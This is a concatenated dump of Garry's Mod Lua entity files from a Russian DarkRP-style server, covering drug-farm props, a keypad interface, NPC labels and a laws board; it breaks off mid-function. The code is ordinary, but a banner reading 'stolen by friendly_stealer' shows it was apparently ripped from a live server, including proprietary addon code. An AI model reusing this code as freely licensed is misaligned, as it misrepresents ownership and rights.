--PATH addons/the_cocaine_factory/lua/entities/cocaine_cooking_plate/cl_init.lua:
include( "shared.lua" )

function ENT:Initialize()
end

function ENT:Draw()
	self:DrawModel()
end
--PATH addons/the_cocaine_factory/lua/entities/cocaine_pack/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
end

function ENT:Draw()
	self:DrawModel()		
end		
--PATH gamemodes/darkrp/entities/entities/darkrp_laws/cl_init.lua:
include("shared.lua")

local Laws = {}

ENT.DrawPos = Vector(1, -111, 58)

local color_navy_200 = Color(0, 0, 70, 200)
local color_red = Color(255, 0, 0, 255)
local color_white = color_white

function ENT:Draw()
    self:DrawModel()

    local DrawPos = self:LocalToWorld(self.DrawPos)

    local DrawAngles = self:GetAngles()
    DrawAngles:RotateAroundAxis(self:GetAngles():Forward(), 90)
    DrawAngles:RotateAroundAxis(self:GetAngles():Up(), 90)

    cam.Start3D2D(DrawPos, DrawAngles, 0.4)

        surface.SetDrawColor(0, 0, 0, 255)
        surface.DrawRect(0, 0, 558, 290)

        draw.RoundedBox(4, 0, 0, 558, 30, color_navy_200)

        draw.DrawNonParsedSimpleText(DarkRP.getPhrase("laws_of_the_land"), "Roboto20", 279, 5, color_red, TEXT_ALIGN_CENTER)

        local lastHeight = 0
        for k, v in ipairs(Laws) do
            draw.DrawNonParsedText(string.format("%u. %s", k, v), "Roboto20", 5, 35 + lastHeight, color_white)
            lastHeight = lastHeight + (fn.ReverseArgs(string.gsub(v, "\n", "")) + 1) * 21
        end

    cam.End3D2D()
end

local function addLaw(inLaw)
    local law = DarkRP.textWrap(inLaw, "textLaws", weight(524))

    local lawNumber = table.insert(Laws, law)
    hook.Run("addLaw", lawNumber, inLaw)
end

local function umAddLaw()
	local law = net.ReadString()
    timer.Simple(0, fn.Curry(addLaw, 2)(law))
end

net.Receive("DRP_AddLaw", umAddLaw)

local function umRemoveLaw()
    local i = net.ReadInt(6)
    local removed = table.remove(Laws, i)
    hook.Run("removeLaw", i, removed)
end
net.Receive("DRP_RemoveLaw", umRemoveLaw)

local function umResetLaws()
    Laws = {}
    fn.Foldl(function(val,v) addLaw(v) end, nil, GAMEMODE.Config.DefaultLaws)
    hook.Run("resetLaws")
end
net.Receive("DRP_ResetLaws", umResetLaws)

function DarkRP.getLaws()
    return Laws
end

timer.Simple(0, function()
    fn.Foldl(function(val,v) addLaw(v) end, nil, GAMEMODE.Config.DefaultLaws)
end)

--PATH addons/duels/lua/entities/duel_huesos/cl_init.lua:
include( 'shared.lua' )
 
surface.CreateFont( "npc", {
	font = "Arial",
	size = 40,
	weight = 800,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = true,
	additive = false,
	outline = false,
})

surface.CreateFont( "npc2", {
	font = "Arial",
	size = 30,
	weight = 600,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = true,
	additive = false,
	outline = false,
})

local color_white = Color(255,255,255)
local color_black = Color(0,0,0)
local complex_off = Vector(0, 0, 9)
local ang = Angle(0, 90, 90)

local cam_End3D2D, cam_Start3D2D, LocalPlayer, CurTime, draw_SimpleTextOutlined, math_sin = cam.End3D2D, cam.Start3D2D, LocalPlayer, CurTime, draw.SimpleTextOutlined, math.sin

function ENT:Draw()
	self:DrawModel()

	if (LocalPlayer():GetPos():Distance(self:GetPos()) < 200 or LocalPlayer():GetEyeTrace().Entity == self) then
	
		local bone = self:LookupBone('ValveBiped.Bip01_Head1')
		pos = self:GetBonePosition(bone) + complex_off
		ang.y = (LocalPlayer():EyeAngles().y - 90)
	
		cam_Start3D2D(pos, ang, 0.03)
		draw_SimpleTextOutlined('Дуэли', '3d2d', 0, 0, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM, 1, color_black)
		cam_End3D2D()
	end
end
--PATH addons/111mod/lua/entities/ent_picture2/shared.lua:
ENT.Type = 'anim'
ENT.PrintName = 'Picture'
ENT.Author = 'aStonedPenguin'
ENT.Base = 'base_anim'
ENT.Category = 'RP'
ENT.Spawnable = true

function ENT:SetupDataTables()
	self:NetworkVar('String', 1, 'URL')
	self:NetworkVar("Entity", 1, "owning_ent")
end
--PATH addons/truefishing/lua/entities/fishing_rod_buoy/shared.lua:
ENT.Type 			= "anim"
ENT.Base 			= "base_anim"
ENT.PrintName		= "Buoy"
ENT.Purpose			= "Less buggy this way"
ENT.Author			= "Tomasas"

function ENT:SetupDataTables()
	self:DTVar("Entity", 0, "Player")
end

--PATH addons/truefishing/lua/entities/fishing_rod_hook/cl_init.lua:
include('shared.lua')

	
ENT.RenderGroup = RENDERGROUP_OPAQUE

function ENT:Draw()
	self:DrawModel()
end

--PATH addons/bricks_gangs/lua/entities/gangs_npc/shared.lua:
ENT.Type = 'ai'
ENT.Base = 'base_ai'
ENT.PrintName = 'Создание банды'
ENT.Spawnable = true
ENT.Category = 'GambitRP | Банды'
--PATH addons/111mod/lua/entities/keypad/cl_panel.lua:
surface.CreateFont("KeypadAbort", {font = "Roboto", size = 45, weight = 900})
surface.CreateFont("KeypadOK", {font = "Roboto", size = 60, weight = 900})
surface.CreateFont("KeypadNumber", {font = "Roboto", size = 70, weight = 600})
surface.CreateFont("KeypadEntry", {font = "Roboto", size = 120, weight = 900})
surface.CreateFont("KeypadStatus", {font = "Roboto", size = 60, weight = 900})

local COLOR_GREEN = Color(0, 255, 0)
local COLOR_RED = 	Color(255, 0, 0)

local function DrawLines(lines, x, y)
	local text = table.concat(lines, "\n")
	local total_w, total_h = surface.GetTextSize(text)

	local y_off = 0

	for k, v in ipairs(lines) do
		local w, h = surface.GetTextSize(v)

		surface.SetTextPos(x - w / 2, y - total_h / 2 + y_off)
		surface.DrawText(v)

		y_off = y_off + h
	end	
end

local elements = {
	{ -- Screen
		x = 0.075,
		y = 0.04,
		w = 0.85,
		h = 0.25,
		color = Color(50, 75, 50, 255),
		render = function(self, x, y)
			local status = self:GetStatus()

			if status == self.Status_None then
				surface.SetFont("KeypadEntry")

				local text = self:GetText()

				local textw, texth = surface.GetTextSize(text)			

				surface.SetTextColor(color_white)
				surface.SetTextPos(x - textw / 2, y - texth / 2)
				surface.DrawText(text)
			elseif status == self.Status_Denied then
				surface.SetFont("KeypadStatus")
				surface.SetTextColor(COLOR_RED)

				if self:GetText() == "1337" then
					DrawLines({"ACC355", "D3N13D"}, x, y)
				else
					DrawLines({"ACCESS", "DENIED"}, x, y)
				end
			elseif status == self.Status_Granted then
				surface.SetFont("KeypadStatus")
				surface.SetTextColor(COLOR_GREEN)

				if self:GetText() == "1337" then
					DrawLines({"ACC355", "GRAN73D"}, x, y)
				else
					DrawLines({"ACCESS", "GRANTED"}, x, y)
				end
			end
		end,
	},
	{ -- ABORT
		x = 0.075,
		y = 0.04 + 0.25 + 0.03,
		w = 0.85 / 2 - 0.04 / 2 + 0.05,
		h = 0.125,
		color = Color(120, 25, 25),
		hovercolor = Color(180, 25, 25),
		text = "ABORT",
		font = "KeypadAbort",
		click = function(self)
			self:SendCommand(self.Command_Abort)
		end
	},
	{ -- OK
		x = 0.5 + 0.04 / 2 + 0.05,
		y = 0.04 + 0.25 + 0.03,
		w = 0.85 / 2 - 0.04 / 2 - 0.05,
		h = 0.125,
		color = Color(25, 120, 25),
		hovercolor = Color(25, 180, 25),
		text = "OK",
		font = "KeypadOK",
		click = function(self)
			self:SendCommand(self.Command_Accept)
		end
	}
}

do -- Create numbers
	for i = 1, 9 do
		local column = (i - 1) % 3

		local row = math.floor((i - 1) / 3)
		
		local element = {
			x = 0.075 + (0.3 * column),
			y = 0.175 + 0.25 + 0.05 + ((0.5 / 3) * row),
			w = 0.25,
			h = 0.13,
			color = Color(120, 120, 120),
			hovercolor = Color(180, 180, 180),
			text = tostring(i),
			click = function(self)
				self:SendCommand(self.Command_Enter, i)
			end
		}

		table.insert(elements, element)
	end
end


function ENT:Paint(w, h, x, y)
	local hovered = self:GetHoveredElement()

	for k, element in ipairs(elements) do
		surface.SetDrawColor(element.color)

		local element_x = w * element.x
		local element_y = h * element.y
		local element_w = w * element.w
		local element_h = h * element.h

		if element == hovered and element.hovercolor then
			surface.SetDrawColor(element.hovercolor)
		end

		surface.DrawRect(
			element_x, 
			element_y,
			element_w,
			element_h
		)

		local cx = element_x + element_w / 2
		local cy = element_y + element_h / 2

		if element.text then
			surface.SetFont(element.font or "KeypadNumber")

			local textw, texth = surface.GetTextSize(element.text)

			surface.SetTextColor(color_black)
			surface.SetTextPos(cx - textw / 2, cy - texth / 2)
			surface.DrawText(element.text)
		end

		if element.render then
			element.render(self, cx, cy)
		end

	end
end

function ENT:GetHoveredElement()
	local scale = self.Scale

	local w, h = self.Width2D, self.Height2D
	local x, y = self:CalculateCursorPos()

	for _, element in ipairs(elements) do
		local element_x = w * element.x
		local element_y = h * element.y
		local element_w = w * element.w
		local element_h = h * element.h

		if 	element_x < x and element_x + element_w > x and
			element_y < y and element_y + element_h > y 
		then
			return element
		end
	end
end
--PATH addons/accessory/lua/entities/npc_accessory_vendor/shared.lua:
ENT.Base = "base_ai"
ENT.Type = "ai"
ENT.PrintName = "Accessory Vendor"
ENT.Category = "Other"
ENT.Spawnable = true
--PATH addons/rptip/lua/entities/npc_ashot/cl_init.lua:
include('shared.lua')
surface.CreateFont( "ashotbleat", {
	font = "Arial",
	size = 45,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = true,
	additive = false,
	outline = false,
})
surface.CreateFont( "ashotbleat2", {
	font = "Arial",
	size = 75,
	weight = 1000,
	blursize = 0,
	scanlines = 0,
	antialias = true,
	underline = false,
	italic = false,
	strikeout = false,
	symbol = false,
	rotary = false,
	shadow = true,
	additive = false,
	outline = false,
})

local color_white = Color(255,255,255)
local color_black = Color(0,0,0)

local ipairs = ipairs
local CurTime = CurTime
local LocalPlayer = LocalPlayer
local math_sin = math.sin
local math_pi = math.pi
local cam_Start3D2D = cam.Start3D2D
local cam_End3D2D = cam.End3D2D
local draw_SimpleTextOutlined = draw.SimpleTextOutlined
local ents_FindByClass = ents.FindByClass
local vec = Vector(0, 0, 75)
local color_white = Color(255, 255, 255)
local color_black = Color(0, 0, 0)

function ENT:Draw()
	self:DrawModel()
	local pos = self:GetPos()
	local ang = self:GetAngles()
	local dist = pos:Distance(LocalPlayer():GetPos())
	if (dist > 350) then return end
	color_white.a = 350 - dist
	color_black.a = 350 - dist
	ang:RotateAroundAxis(ang:Forward(), 90)
	ang:RotateAroundAxis(ang:Right(), -90)
	ang:RotateAroundAxis(ang:Right(), math_sin(CurTime() * math_pi) * -45)
	cam_Start3D2D(pos + vec + ang:Right() * 1.2, ang, 0.065)
	draw_SimpleTextOutlined('Петрович', '3d2d', 0, -200, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, color_black)
	cam_End3D2D()
	ang:RotateAroundAxis(ang:Right(), 180)
	cam_Start3D2D(pos + vec + ang:Right() * 1.2, ang, 0.065)
	draw_SimpleTextOutlined('Петрович', '3d2d', 0, -200, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP, 1, color_black)
	cam_End3D2D()
end

local function DrawPosInfoFD(icon,pos, s)
	local d = math.floor(LocalPlayer():GetPos():Distance(pos)/100)
	local pos = pos:ToScreen()

	surface.SetDrawColor(255, 255, 255, 255)
	surface.SetMaterial(Material(icon))
	surface.DrawTexturedRect(pos.x, pos.y, 16, 16)

	--surface.SetFont( "ChatFont" )
	surface.SetFont( "ashotbleat" )
	surface.SetTextColor(235, 203, 87, 255)
	surface.SetTextPos(pos.x + 20, pos.y)
	surface.DrawText(s)

	local x, y = surface.GetTextSize(s)

	surface.SetFont("Default" )
	surface.SetTextColor(0, 0, 0, 255)
	surface.SetTextPos(pos.x + 1 + 20, pos.y + y + 1)
	surface.DrawText("Дистанция: "..d.."m")

	surface.SetFont("Default" )
	surface.SetTextColor(255, 255, 255, 255)
	surface.SetTextPos(pos.x + 20, pos.y + y)
	surface.DrawText("Дистанция: "..d.."m")
end

hook.Add("HUDPaint","PaintRpBoxHud", function()
	if LocalPlayer():GetNW2Bool("TakeBox", false) then
		for k,v in pairs(ents.FindByClass("npc_ashot")) do
			DrawPosInfoFD("icon16/box.png",v:EyePos(), rp_box.NPC_name)
		end
	end
end)
--PATH addons/deceive/lua/entities/sent_disguise_drawer/shared.lua:
-- local ENT = {}

ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.ClassName = "sent_disguise_drawer"
ENT.PrintName = "Disguise Drawer"
ENT.Author = "tenrys"
ENT.Category = "Deceive - Disguise"
ENT.Spawnable = false
ENT.AdminSpawnable = false

-- scripted_ents.Register(ENT, ENT.ClassName)
--PATH addons/111mod/lua/entities/travka_ent/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Посылка"
ENT.Category = "@GambitEnts"
ENT.Spawnable = true
ENT.AdminSpawnable = true
--PATH addons/111mod/lua/entities/travka_vidashka/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_gmodentity"
ENT.PrintName = "Выдача посылок"
ENT.Category = "@GambitEnts"
ENT.Author = ""
ENT.Spawnable = true
ENT.AdminSpawnable = true
--PATH addons/vcmod_main_autoupdate/lua/entities/vc_npc_cardealer/cl_init.lua:
// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.

include('shared.lua')

ENT.RenderGroup = RENDERGROUP_BOTH

function ENT:Initialize() end
--PATH addons/vcmod_main_autoupdate/lua/entities/vc_pickup_healthkit_10/cl_init.lua:
// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.

include('shared.lua')

ENT.RenderGroup = RENDERGROUP_BOTH

function ENT:Initialize() self.VC_Color = Color(100, 255, 55, 255) self.VC_Length = 210 self.VC_Text = "Vehicle Repair 10%" self.VC_PVsb = util.GetPixelVisibleHandle() end
--PATH addons/vcmod_main_autoupdate/lua/entities/vc_spikestrip/cl_init.lua:
// Copyright © 2020 VCMod (freemmaann). All Rights Reserved. if you have any complaints or ideas contact me: steam - steamcommunity.com/id/freemmaann/ or email - freemmaann@gmail.com.

include('shared.lua')

ENT.RenderGroup = RENDERGROUP_BOTH

function ENT:Initialize() end

function ENT:Think() if VC and VC.CodeEnt.Spikestrip and VC.CodeEnt.Spikestrip.Think then return VC.CodeEnt.Spikestrip.Think(self) end end
--PATH addons/zeros_methlab2/lua/entities/zmlab2_item_lox/cl_init.lua:
include("shared.lua")

function ENT:Initialize()

end

function ENT:DrawTranslucent()
	self:Draw()
end

function ENT:Draw()
	self:DrawModel()
end

--PATH addons/zeros_methlab2/lua/entities/zmlab2_item_palette/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.Model = "models/zerochain/props_methlab/zmlab2_palette.mdl"
ENT.Spawnable = true
ENT.AdminSpawnable = false
ENT.PrintName = "Palette"
ENT.Category = "Zeros Methlab 2"
ENT.RenderGroup = RENDERGROUP_BOTH

function ENT:CanProperty(ply)
    return zmlab2.Player.IsAdmin(ply)
end

function ENT:CanTool(ply, tab, str)
    return zmlab2.Player.IsAdmin(ply)
end

function ENT:CanDrive(ply)
    return zmlab2.Player.IsAdmin(ply)
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_generator/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.AutomaticFrameAdvance = true
ENT.Model = "models/zerochain/props_weedfarm/zwf_generator.mdl"
ENT.Spawnable = true
ENT.AdminSpawnable = false
ENT.PrintName = "Generator"
ENT.Category = "Zeros GrowOP"
ENT.RenderGroup = RENDERGROUP_TRANSLUCENT

function ENT:SetupDataTables()
    self:NetworkVar("Int", 0, "Fuel")
    self:NetworkVar("Int", 2, "AnimState")
    self:NetworkVar("Bool", 1, "IsRefilling")
    self:NetworkVar("Entity", 0, "Output")
    self:NetworkVar("Int", 1, "Power")
    self:NetworkVar("Float", 2, "Maintance")

    if (SERVER) then
        self:SetIsRefilling(false)
        self:SetFuel(0)
        self:SetPower(0)
        self:SetAnimState(0)
        self:SetMaintance(0)
    end
end

function ENT:EnableButton(ply)
    local trace = ply:GetEyeTrace()

    local lp = self:WorldToLocal(trace.HitPos)

    if lp.z > 5 and lp.z < 13 and lp.y < 10 and lp.y > 2 then
        return true
    else
        return false
    end
end

function ENT:MaintanceButton(ply)
    local trace = ply:GetEyeTrace()

    local lp = self:WorldToLocal(trace.HitPos)

    if lp.z > 17 and lp.z < 29 and lp.y < 18 and lp.y > 16 and lp.x < 18 and lp.x > -18  then
        return true
    else
        return false
    end
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_joint_ent/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	zwf.f.EntList_Add(self)

	self.Last_IsBurning = false

	self.IsInitialized = false

	timer.Simple(0.1,function()
		if IsValid(self) then
			self.IsInitialized = true
		end
	end)
end

function ENT:Draw()
	self:DrawModel()
end

function ENT:DrawTranslucent()
	self:Draw()
end

function ENT:Think()
	if self.IsInitialized == false then return end

	if zwf.f.InDistance(LocalPlayer():GetPos(), self:GetPos(), 500) then

		local _IsBurning = self:GetIsBurning()
		if self.Last_IsBurning ~= _IsBurning then
			self.Last_IsBurning = _IsBurning

			if self.Last_IsBurning then
				self:SetSkin(1)
				zwf.f.ParticleEffectAttach("zwf_ent_fire", PATTACH_POINT_FOLLOW, self, 1)
			else
				self:StopParticles()
			end
		end
	else
		if self.Last_IsBurning == true then
			self.Last_IsBurning = false
			self:StopParticles()
		end
	end

end

--PATH addons/zeros_weedfarm/lua/entities/zwf_joint_ent/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.Model = "models/zerochain/props_weedfarm/zwf_joint.mdl"
ENT.Spawnable = false
ENT.AdminSpawnable = false
ENT.PrintName = "Joint"
ENT.Category = "Zeros GrowOP"
ENT.RenderGroup = RENDERGROUP_TRANSLUCENT

function ENT:SetupDataTables()
    self:NetworkVar("Int", 1, "WeedID")
    self:NetworkVar("String", 0, "Weed_Name")
    self:NetworkVar("Int", 2, "Weed_THC")
    self:NetworkVar("Int", 3, "Weed_Amount")
    self:NetworkVar("Bool", 0, "IsBurning")

    if (SERVER) then
        self:SetWeedID(-1)
        self:SetWeed_Name("NILL")
        self:SetWeed_THC(-1)
        self:SetWeed_Amount(0)
        self:SetIsBurning(false)
    end
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_nutrition/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.AutomaticFrameAdvance = true
ENT.Model = "models/zerochain/props_weedfarm/zwf_nutritionbottle.mdl"
ENT.Spawnable = false
ENT.AdminSpawnable = false
ENT.PrintName = "Nutrition"
ENT.Category = "Zeros GrowOP"
ENT.RenderGroup = RENDERGROUP_OPAQUE

function ENT:SetupDataTables()
    self:NetworkVar("Int", 1, "NutritionID")

    if (SERVER) then
        self:SetNutritionID(-1)
    end
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_packingstation/cl_init.lua:
include("shared.lua")

function ENT:Initialize()
	zwf.f.EntList_Add(self)
	self.LastJarCount = -1
	self.LastStage = -1
end

function ENT:Draw()
	self:DrawModel()

	if GetConVar("zwf_cl_vfx_drawui"):GetInt() == 1 and zwf.f.InDistance(LocalPlayer():GetPos(), self:GetPos(), 300) then
		self:DrawInfo()
	end
end

function ENT:DrawInfo()

	local autopacker = self:GetAutoPacker()

	if self.LastStage > 0 then
		if autopacker == false then
			cam.Start3D2D(self:LocalToWorld(self:GetGamePos()), self:LocalToWorldAngles(Angle(180, 90, 180)), 0.05)

				if self:OnHitButton(LocalPlayer()) then
					draw.RoundedBox(5, -46 , -34, 92, 80,  zwf.default_colors["orange01"])
				else
					draw.RoundedBox(5, -46 , -34, 92, 80,  zwf.default_colors["gray02"])
				end
				draw.SimpleText("[E]", "zwf_packingstation_font01", 0, 0, zwf.default_colors["white01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
			cam.End3D2D()
		else

			cam.Start3D2D(self:LocalToWorld(Vector(-17, 0, 41)), self:LocalToWorldAngles(Angle(180, 90, 180)), 0.05)
				draw.RoundedBox(5, -300, 80, 600, 40, zwf.default_colors["gray02"])
				local width = (600 / math.Clamp(zwf.config.PackingStation.PackingCount, 7, 99)) * self.LastStage
				draw.RoundedBox(5, -300, 80, width, 40, zwf.default_colors["green04"])
			cam.End3D2D()

		end
	end

	cam.Start3D2D(self:LocalToWorld(Vector(20, 0, 65)), self:LocalToWorldAngles(Angle(180, 90, -90)), 0.05)

		draw.SimpleText(zwf.language.General["packingstation_info"], "zwf_packingstation_font02", 0, 100, zwf.default_colors["white01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)

	cam.End3D2D()

	if self.LastJarCount > 0 then
		cam.Start3D2D(self:LocalToWorld(Vector(20, 0, 65)), self:LocalToWorldAngles(Angle(180, 90, -90)), 0.05)
			draw.RoundedBox(5, -300, -10, 600, 15, zwf.default_colors["black03"])
			draw.SimpleText(self:GetWeedName(), "zwf_packingstation_font01", 0, 0, zwf.default_colors["white01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)
			draw.RoundedBox(5, -300, 70, 600, 15, zwf.default_colors["black03"])

		cam.End3D2D()

		if self.LastStage <= 0 then
			cam.Start3D2D(self:LocalToWorld(Vector(-18, 0, 41)), self:LocalToWorldAngles(Angle(0, -90, 0)), 0.05)

				if self:OnRemoveButton(LocalPlayer()) then
					draw.RoundedBox(5, -200, -10, 400, 100, zwf.default_colors["red05"])
				else
					draw.RoundedBox(5, -200, -10, 400, 100, zwf.default_colors["black03"])
				end
				draw.SimpleText(zwf.language.General["Remove"], "zwf_packingstation_font01", 0, 0, zwf.default_colors["white01"], TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP)

			cam.End3D2D()
		end
	end
end

function ENT:Think()

	if zwf.f.InDistance(LocalPlayer():GetPos(), self:GetPos(), 1000) then
		local _JarCount = self:GetJarCount()
		local _Gamestage = self:GetGameStage()

		if self.LastJarCount ~= _JarCount then
			self.LastJarCount = _JarCount

			self:RemoveClientModels()

			for i = 1, self.LastJarCount do
				self:SpawnClientModel_Jar(i)
			end
		end

		if _Gamestage ~= self.LastStage  then
			self.LastStage = _Gamestage

			if self.LastStage == -1 then
				zwf.f.ClientAnim(self, "idle", 1)
			else
				zwf.f.ClientAnim(self, "packing", 2)

				local effect = zwf.config.Plants[self:GetPlantID()].pack_effect
				local pos = self:GetPos() + self:GetUp() * 50
				zwf.f.ParticleEffect(effect, pos, self:GetAngles(), self)

				zwf.f.EmitSoundENT("zwf_weed_pack", self)
			end

			local MaxStage = math.Clamp(zwf.config.PackingStation.PackingCount,7,99)

			local fraction = MaxStage / 7

			if self.LastStage == -1 then

				self:SetBodygroup(1, 0)

			elseif self.LastStage < fraction then

				self:SetBodygroup(1,1)

			elseif self.LastStage < fraction * 2  then

				self:SetBodygroup(1,2)
				if IsValid(self.ClientProps["Jar" .. 1]) then
					self.ClientProps["Jar" .. 1]:SetNoDraw(true)
				end

			elseif self.LastStage < fraction * 3 then

				self:SetBodygroup(1,3)
				if IsValid(self.ClientProps["Jar" .. 1]) then
					self.ClientProps["Jar" .. 1]:SetNoDraw(true)
				end
				if IsValid(self.ClientProps["Jar" .. 2]) then
					self.ClientProps["Jar" .. 2]:SetNoDraw(true)
				end

			elseif self.LastStage < fraction * 4 then

				self:SetBodygroup(1,4)
				if IsValid(self.ClientProps["Jar" .. 1]) then
					self.ClientProps["Jar" .. 1]:SetNoDraw(true)
				end
				if IsValid(self.ClientProps["Jar" .. 2]) then
					self.ClientProps["Jar" .. 2]:SetNoDraw(true)
				end
				if IsValid(self.ClientProps["Jar" .. 3]) then
					self.ClientProps["Jar" .. 3]:SetNoDraw(true)
				end

			elseif self.LastStage < fraction * 5 then

				self:SetBodygroup(1,5)
				for i = 1, 4 do
					if IsValid(self.ClientProps["Jar" .. i]) then
						self.ClientProps["Jar" .. i]:SetNoDraw(true)
					end
				end

			elseif self.LastStage < fraction * 6 then

				self:SetBodygroup(1,6)
				for i = 1, 4 do
					if IsValid(self.ClientProps["Jar" .. i]) then
						self.ClientProps["Jar" .. i]:SetNoDraw(true)
					end
				end

			elseif self.LastStage >= MaxStage - 1 then

				self:SetBodygroup(1,7)
				for i = 1, 4 do
					if IsValid(self.ClientProps["Jar" .. i]) then
						self.ClientProps["Jar" .. i]:SetNoDraw(true)
					end
				end

			end
		end
	else
		self:RemoveClientModels()
		self.LastJarCount = -1
		self.LastStage = -1
	end

	self:SetNextClientThink(CurTime())
	return true
end

local jarPos = {
	[1] = Vector(19, -15, 40.6),
	[2] = Vector(19, -5, 40.6),
	[3] = Vector(19, 5, 40.6),
	[4] = Vector(19, 15, 40.6)
}

function ENT:SpawnClientModel_Jar(pos)
	local plantData = zwf.config.Plants[self:GetPlantID()]

	if plantData == nil then return end

	local ent = ents.CreateClientProp("models/zerochain/props_weedfarm/zwf_jar.mdl")
	ent:SetPos(self:LocalToWorld(jarPos[pos]))
	ent:SetAngles(self:GetAngles())
	ent:Spawn()
	ent:Activate()
	ent:SetParent(self)
	ent:SetRenderMode(RENDERMODE_TRANSALPHA)

	ent:SetBodygroup(1, 1)
	ent:SetBodygroup(2, 1)
	ent:SetBodygroup(3, 1)

	ent:SetSkin(plantData.skin)

	self.ClientProps["Jar" .. pos] = ent
end

function ENT:RemoveClientModels()
	if (self.ClientProps and table.Count(self.ClientProps) > 0) then
		for k, v in pairs(self.ClientProps) do
			if IsValid(v) then
				v:Remove()
			end
		end
	end

	self.ClientProps = {}
end

function ENT:OnRemove()
	self:RemoveClientModels()
end

--PATH addons/zeros_weedfarm/lua/entities/zwf_plant/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.AutomaticFrameAdvance = true
ENT.Model = "models/zerochain/props_weedfarm/zwf_plant.mdl"
ENT.Spawnable = false
ENT.AdminSpawnable = false
ENT.PrintName = "Plant"
ENT.Category = "Zeros GrowOP"
ENT.RenderGroup = RENDERGROUP_TRANSLUCENT

--PATH addons/zeros_weedfarm/lua/entities/zwf_weedblock/shared.lua:
ENT.Type = "anim"
ENT.Base = "base_anim"
ENT.AutomaticFrameAdvance = true
ENT.Model = "models/zerochain/props_weedfarm/zwf_weedblock.mdl"
ENT.Spawnable = true
ENT.AdminSpawnable = false
ENT.PrintName = "WeedBlock"
ENT.Category = "Zeros GrowOP"
ENT.RenderGroup = RENDERGROUP_TRANSLUCENT

function ENT:SetupDataTables()
    self:NetworkVar("Int", 0, "WeedID")
    self:NetworkVar("Float", 1, "THC")
    self:NetworkVar("String", 0, "WeedName")
    self:NetworkVar("Int", 1, "WeedAmount")


    if (SERVER) then
        self:SetWeedID(1)
        self:SetTHC(100)
        self:SetWeedName("OG Kush")
        self:SetWeedAmount(100)
    end
end

function ENT:CollectButton(ply)
    local trace = ply:GetEyeTrace()
    local lp = self:WorldToLocal(trace.HitPos)

    if lp.z > 5 and lp.z < 6 and lp.x < 4 and lp.x > -4 and lp.y < 9 and lp.y > -9 then
        return true
    else
        return false
    end
end

--PATH addons/m9k/lua/effects/m9k_rg_muzzle_rifle/init.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/effects/m9k_rg_muzzle_rifle/init.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

function EFFECT:Init(data)
	
	if not IsValid(data:GetEntity()) then return end
	if not IsValid(data:GetEntity():GetOwner()) then return end
	self.WeaponEnt = data:GetEntity()
	self.Attachment = data:GetAttachment()
	
	if self.WeaponEnt == nil or self.WeaponEnt:GetOwner() == nil or self.WeaponEnt:GetOwner():GetVelocity() == nil then 
		return
	else
	
	self.Position = self:GetTracerShootPos(data:GetOrigin(), self.WeaponEnt, self.Attachment)
	self.Forward = data:GetNormal()
	self.Angle = self.Forward:Angle()
	self.Right = self.Angle:Right()
	
	local AddVel = self.WeaponEnt:GetOwner():GetVelocity()
	
	local emitter = ParticleEmitter(self.Position)
	if emitter != nil then	
		local particle = emitter:Add( "sprites/heatwave", self.Position - self.Forward * 4 )
		if particle != nil then
	
			particle:SetVelocity( 80 * self.Forward + 20 * VectorRand() + 1.05 * AddVel )
			particle:SetGravity( Vector( 0, 0, 100 ) )
			particle:SetAirResistance( 160 )

			particle:SetDieTime( math.Rand( 0.2, 0.25 ) )

			particle:SetStartSize( math.random( 25, 40 ) )
			particle:SetEndSize( 10 )

			particle:SetRoll( math.Rand( 180, 480 ) )
			particle:SetRollDelta( math.Rand( -1, 1 ) )
		
		for i = 1,4 do
			local particle = emitter:Add( "particle/particle_smokegrenade", self.Position )

				particle:SetVelocity( 120 * i * self.Forward + 8 * VectorRand() + AddVel )
				particle:SetAirResistance( 400 )
